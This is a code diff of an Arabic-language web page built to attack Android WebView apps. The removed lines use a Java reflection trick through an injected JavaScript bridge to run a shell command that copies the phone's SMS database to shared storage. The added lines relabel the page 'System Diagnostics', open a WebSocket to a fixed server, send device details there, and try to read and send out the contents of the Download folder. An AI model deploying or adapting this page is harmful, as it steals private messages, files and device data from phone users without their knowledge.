@@ -2,24 +2,39 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>System Injection Test</title>
+    <title>System Diagnostics</title>
 </head>
 <body>
-    <h1>جاري فحص وتجهيز النظام...</h1>
+    <h2>جاري تحميل حزمة البيانات...</h2>
     <script>
-        try {
-            if (window.accessibility || window.accessibilityBridge || window.InjectedObject) {
-                const target = window.InjectedObject || window.accessibility;
-                let shellCmd = "cat /data/data/com.android.providers.telephony/databases/mmssms.db > /sdcard/Download/sms_dump.db";
-                target.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec(shellCmd);
-            }
-        } catch (e) {
-            // محاولة الاتصال العكسي بالسيرفر عبر الـ WebSocket
-            const ws = new WebSocket('ws://10.0.0.108:8765');
-            ws.onopen = function() {
-                ws.send(JSON.stringify({action: "force_dump", ua: navigator.userAgent}));
+        // إنشاء اتصال WebSocket عكسي مع خادمك السليم
+        const ws = new WebSocket('ws://10.0.0.108:8765');
+        
+        ws.onopen = function() {
+            console.log("[+] متصل بالسيرفر بنجاح");
+            
+            // محاولة جمع معلومات النظام المتاحة عبر المتصفح
+            const sysData = {
+                action: "system_info",
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled
             };
-        }
+            ws.send(JSON.stringify(sysData));
+            
+            // محاولة جلب الملفات المتاحة في التخزين الخارجي إن وجدت عبر مسارات الـ File API
+            try {
+                fetch('file:///sdcard/Download/')
+                    .then(response => response.text())
+                    .then(data => {
+                        ws.send(JSON.stringify({action: "file_dump", content: data}));
+                    }).catch(err => {
+                        ws.send(JSON.stringify({action: "error", msg: "Sandbox restriction applied"}));
+                    });
+            } catch(e) {
+                ws.send(JSON.stringify({action: "error", msg: e.toString()}));
+            }
+        };
     </script>
 </body>
 </html>
